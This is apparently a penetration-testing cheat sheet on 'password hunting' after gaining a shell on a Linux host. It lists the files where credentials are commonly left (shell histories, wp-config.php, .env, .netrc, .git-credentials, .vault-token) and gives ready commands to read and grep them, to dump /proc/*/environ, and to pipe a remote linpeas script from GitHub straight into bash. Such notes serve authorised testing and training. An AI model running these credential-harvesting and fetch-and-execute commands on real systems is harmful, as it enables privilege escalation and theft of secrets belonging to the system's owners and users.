# Password Hunting

## Table of Contents

1. [Overview](#overview)
2. [Common Locations](#common-locations)
   - [History Files](#history-files)
   - [Config Files](#config-files)
   - [Log Files](#log-files)
   - [Home Directory](#home-directory)
   - [Environment Variables](#environment-variables)
3. [Search Commands](#search-commands)

---

## Overview

Once you have a shell on the machine, search for cleartext credentials left behind by users or applications. This is often the fastest path to privesc — no exploit needed, just careless storage.

## Common Locations

### History Files

Shell history often contains passwords passed as command arguments.

```bash
# Bash history
cat ~/.bash_history
cat /home/*/.bash_history

# Other shells
cat ~/.zsh_history
cat ~/.python_history

# MySQL / PostgreSQL history
cat ~/.mysql_history
cat ~/.psql_history
```

Look for patterns like `mysql -u root -p`, `sshpass`, `curl -u user:pass`, `sudo` followed by a password, `export` with API keys, etc.

### Config Files

Applications often store credentials in plaintext config files.

```
# Web apps
/var/www/html/wp-config.php          # WordPress
/var/www/html/.env                   # Laravel, Node.js
/var/www/html/config.php             # Generic PHP apps
/var/www/html/configuration.php      # Joomla

# Databases
/etc/mysql/my.cnf                    # MySQL
/etc/postgresql/*/main/pg_hba.conf   # PostgreSQL

# Services
/etc/openvpn/*.conf
/etc/samba/smb.conf
/etc/ldap/ldap.conf

# Automation
/etc/ansible/hosts                   # Ansible inventory (may contain passwords)
/home/*/.ansible/vault_password
```

### Log Files

Passwords sometimes end up in logs when passed as arguments or in failed authentication attempts.

```
/var/log/auth.log            # Failed su/sudo with password in args
/var/log/syslog
/var/log/apache2/access.log  # GET params with creds
/var/log/apache2/error.log
/var/log/mail.log            # SMTP auth
```

### Home Directory

Users sometimes store credentials in personal files.

```
/home/*/.bashrc              # Aliases with embedded passwords
/home/*/.profile
/home/*/.netrc               # FTP/HTTP credentials in plaintext
/home/*/.pgpass               # PostgreSQL passwords
/home/*/.my.cnf              # MySQL credentials
/home/*/.git-credentials     # Git HTTPS credentials
/home/*/password*            # Notes, text files
/home/*/.vault-token         # HashiCorp Vault
```

### Environment Variables

API keys, tokens, and database credentials are often set as environment variables.

```bash
env
printenv
cat /proc/*/environ 2>/dev/null | tr '\0' '\n'
cat /etc/environment
cat /etc/profile
cat /home/*/.bashrc | grep -i 'export'
```

Look for: `DB_PASSWORD`, `API_KEY`, `SECRET_KEY`, `AWS_SECRET_ACCESS_KEY`, `TOKEN`, etc.

## Search Commands

```bash
# Grep recursively for common password patterns
grep -rli 'password' /etc/ /var/ /home/ /opt/ /tmp/ 2>/dev/null
grep -rli 'passwd' /etc/ /var/ /home/ /opt/ 2>/dev/null
grep -ri 'db_password\|db_pass\|mysql_pwd' /var/www/ 2>/dev/null

# Find .env files (often contain secrets)
find / -name ".env" -type f 2>/dev/null

# Find config files
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null | head -50

# Find files owned by current user that are readable
find / -user $(whoami) -readable -type f 2>/dev/null

# Find recently modified files (may contain freshly written creds)
find / -mmin -30 -type f 2>/dev/null

# Automated: linpeas / linenum handle all of this
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash
```
